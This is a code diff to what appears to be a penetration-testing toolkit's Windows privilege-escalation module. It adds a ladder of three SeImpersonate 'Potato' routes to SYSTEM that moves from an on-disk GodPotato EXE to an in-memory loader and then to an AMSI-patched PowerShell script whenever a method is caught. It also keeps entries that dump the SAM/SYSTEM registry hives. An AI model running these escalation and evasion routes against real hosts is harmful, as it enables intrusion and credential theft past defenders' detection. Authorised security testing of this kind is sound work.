@@ -41,6 +41,8 @@ class Vector:
     safe_proof: str = None
     cleanup: str = None      # cleanup command when the vector changes state, else None
     report_type: str = ""    # the reportkb vector_type a proven finding records under
+    family: str = None       # objective shared by delivery alternates (e.g. "seimpersonate")
+    delivery: str = None     # the evasion.Technique key this vector's delivery presents
 
     @property
     def score(self):
@@ -181,20 +183,6 @@ def _cap_vector(basename, cap, ctx):
 #: privilege token -> the route. ``needs`` names an operator-staged binary where one
 #: is required (see SUPPLIED-BINARIES.md); the command references the staging dir.
 WIN_PRIVS = {
-    "SeImpersonatePrivilege": dict(
-        report_type="seimpersonate", key="seimpersonate", title="SeImpersonate → SYSTEM (Potato)",
-        exploitability="high", safety="config-change", detection="moderate",
-        needs="a Potato (GodPotato/PrintSpoofer) staged in {stage}",
-        command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
-        cleanup="del {stage}\\GodPotato.exe",
-        detail="token impersonation to SYSTEM — the most common service-account win."),
-    "SeAssignPrimaryTokenPrivilege": dict(
-        report_type="seimpersonate", key="seimpersonate", title="SeAssignPrimaryToken → SYSTEM (Potato)",
-        exploitability="high", safety="config-change", detection="moderate",
-        needs="a Potato staged in {stage}",
-        command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
-        cleanup="del {stage}\\GodPotato.exe",
-        detail="same Potato route as SeImpersonate."),
     "SeBackupPrivilege": dict(
         report_type="sebackup", key="sebackup", title="SeBackup → dump the SAM/SYSTEM hives",
         exploitability="high", safety="config-change", detection="moderate",
@@ -238,6 +226,52 @@ WIN_GROUPS = {
         cleanup="del {stage}\\sam {stage}\\sys",
         detail="the group grants SeBackup in practice — read the hives, dump offline."),
 }
+
+
+#: The impersonation objective (SeImpersonate / SeAssignPrimaryToken → SYSTEM) is one
+#: goal reached by several tools whose *delivery methods* differ — so it is a delivery
+#: ladder, not one vector. The orchestrator fires them in evasion-posture order and, when
+#: one is caught, climbs to the next method (native PE on disk → fileless in-memory →
+#: PowerShell script). ``delivery`` names the :mod:`fieldkit.evasion` technique each
+#: presents; a live catch marks that technique red so the loop won't re-burn it.
+_IMPERSONATION_PRIVS = {"SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"}
+
+WIN_IMPERSONATION = (
+    dict(key="seimpersonate:native", delivery="native-exe", detection="moderate",
+         title="SeImpersonate → SYSTEM (GodPotato, native EXE)",
+         needs="GodPotato.exe staged in {stage}",
+         command='{stage}\\GodPotato.exe -cmd "cmd /c whoami"',
+         cleanup="del {stage}\\GodPotato.exe",
+         detail="token impersonation to SYSTEM via GodPotato — a native PE on disk, no AMSI surface."),
+    dict(key="seimpersonate:inmem", delivery="inmem-fileless", detection="moderate",
+         title="SeImpersonate → SYSTEM (in-memory potato)",
+         needs="a potato assembly + an in-memory .NET loader staged in {stage}",
+         command='{stage}\\loader.exe potato "cmd /c whoami"',
+         cleanup=None,
+         detail="same objective loaded reflectively — nothing on disk, but a managed loader "
+                "(AMSI surface). Climb here when the on-disk EXE is caught."),
+    dict(key="seimpersonate:ps", delivery="ps-amsi-revshell", detection="loud",
+         title="SeImpersonate → SYSTEM (PowerShell potato)",
+         needs="an AMSI-patched PowerShell potato in {stage}",
+         command='powershell -ep bypass -f {stage}\\potato.ps1',
+         cleanup="del {stage}\\potato.ps1", shell="powershell",
+         detail="script-delivered potato — the most AMSI-exposed path, last resort."),
+)
+
+
+def _impersonation_vector(spec, ctx, evidence):
+    stage = ctx.stage_win
+    command = spec["command"].replace("{stage}", stage)
+    cleanup = (spec.get("cleanup") or "").replace("{stage}", stage) or None
+    detail = spec["detail"] + "  needs: " + spec["needs"].replace("{stage}", stage)
+    return Vector(
+        key=spec["key"], title=spec["title"],
+        exploitability="high", safety="config-change", detection=spec["detection"],
+        command=command, shell=spec.get("shell", "cmd"), host=ctx.host, detail=detail,
+        evidence=evidence,
+        safe_proof="the vector runs `whoami` in the SYSTEM context.",
+        cleanup=cleanup, report_type="seimpersonate",
+        family="seimpersonate", delivery=spec["delivery"])
 
 
 def _win_vector(spec, ctx, evidence):
@@ -323,6 +357,12 @@ def _d_sudo_env(facts, ctx):
 
 def _d_win_privs(facts, ctx):
     seen = set()
+    impersonation = facts.privs & _IMPERSONATION_PRIVS
+    if impersonation:
+        which = ", ".join(sorted(impersonation))
+        for spec in WIN_IMPERSONATION:
+            yield _impersonation_vector(spec, ctx, evidence=f"whoami /priv: {which}")
+        seen.add("seimpersonate")
     for priv in sorted(facts.privs):
         spec = WIN_PRIVS.get(priv)
         if spec and spec["key"] not in seen:
